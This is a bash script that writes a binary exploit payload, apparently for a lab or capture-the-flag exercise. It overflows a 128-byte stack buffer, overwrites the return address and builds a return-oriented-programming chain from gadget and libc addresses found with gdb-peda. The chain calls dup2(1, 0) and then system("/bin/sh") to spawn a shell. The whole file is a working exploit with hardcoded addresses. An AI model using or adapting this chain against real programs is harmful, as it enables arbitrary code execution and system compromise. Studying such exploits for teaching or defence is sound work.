#!/bin/bash

echo "writing payload.bin..."

function nop {
    #gdb-peda$ ropsearch "ret"
    #Searching for ROP gadget: 'ret' in: binary ranges
    #0x000055555555501a : (b'c3')    ret
    echo -n -e "\x1a\x50\x55\x55\x55\x55\x00\x00" >> payload.bin
}

function pop_rdi {
    # gdb-peda$ ropsearch "pop rdi"
    # Searching for ROP gadget: 'pop rdi' in: binary ranges
    # 0x00005555555551eb : (b'5fc3')    pop rdi; ret
    echo -n -e "\xeb\x51\x55\x55\x55\x55\x00\x00" >> payload.bin
}

function pop_rsi_pop_r15 {
    # gdb-peda$ ropsearch "pop rsi"
    # Searching for ROP gadget: 'pop rsi' in: binary ranges
    # 0x00005555555551e9 : (b'5e415fc3')    pop rsi; pop r15; ret
    echo -n -e "\xe9\x51\x55\x55\x55\x55\x00\x00" >> payload.bin
}

function dup2 {
    # gdb-peda$ p dup2
    # $2 = {<text variable, no debug info>} 0x7ffff7d15010 <dup2>
    echo -n -e "\x10\x50\xd1\xf7\xff\x7f\x00\x00" >> payload.bin
}

function system {
    # gdb-peda$ p system
    # $3 = {int (const char *)} 0x7ffff7c50d70 <__libc_system>
    echo -n -e "\x70\x0d\xc5\xf7\xff\x7f\x00\x00" >> payload.bin
}

function exit_ {
    # gdb-peda$ p exit
    # $4 = {void (int)} 0x7ffff7c455f0 <__GI_exit>
    echo -n -e "\xf0\x55\xc4\xf7\xff\x7f\x00\x00" >> payload.bin
}

# fill 128 (0x80) bytes of buffer
echo -n -e "\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa" > payload.bin
echo -n -e "\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa" >> payload.bin
echo -n -e "\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa" >> payload.bin
echo -n -e "\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa" >> payload.bin
echo -n -e "\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa" >> payload.bin
echo -n -e "\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa" >> payload.bin
echo -n -e "\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa" >> payload.bin
echo -n -e "\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa" >> payload.bin
echo -n -e "\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa" >> payload.bin
echo -n -e "\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa" >> payload.bin
echo -n -e "\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa" >> payload.bin
echo -n -e "\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa" >> payload.bin
echo -n -e "\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa" >> payload.bin
echo -n -e "\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa" >> payload.bin
echo -n -e "\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa" >> payload.bin
echo -n -e "\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa" >> payload.bin

# overwrite saved RBP
echo -n -e "\xbb\xbb\xbb\xbb\xbb\xbb\xbb\xbb" >> payload.bin

# overwrite return address... rop chain starts!

# set arg1 = 0
pop_rsi_pop_r15
echo -n -e "\x00\x00\x00\x00\x00\x00\x00\x00" >> payload.bin # rsi=0 due to "pop rsi"
echo -n -e "\x00\x00\x00\x00\x00\x00\x00\x00" >> payload.bin # r15=0 due to "pop r15"

# set arg0=1
pop_rdi
echo -n -e "\x01\x00\x00\x00\x00\x00\x00\x00" >> payload.bin # rdi=1 due to "pop rdi"

# dup2(1, 0)
dup2

# align, else system() crashes at:
# => 0x7ffff7c50973 <do_system+115>: movaps XMMWORD PTR [rsp],xmm1
nop

# set arg0 = "/bin/sh" for system()
pop_rdi
echo -n -e "\x78\x86\xdd\xf7\xff\x7f\x00\x00" >> payload.bin # addr of "/bin/sh"

# system("/bin/sh")
system

exit_

xxd -g 8 -e payload.bin

